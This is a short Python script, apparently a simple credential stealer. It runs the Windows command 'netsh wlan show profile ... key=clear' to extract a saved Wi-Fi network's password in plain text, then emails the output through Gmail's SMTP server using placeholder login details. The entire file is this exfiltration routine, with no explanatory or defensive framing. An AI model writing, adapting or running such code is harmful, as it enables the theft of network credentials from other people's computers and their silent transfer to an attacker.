import smtplib,subprocess

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


command = "netsh wlan show profile vivo1723 key=clear"
result = subprocess.check_output(command,shell=True)
send_mail("email","password",result)
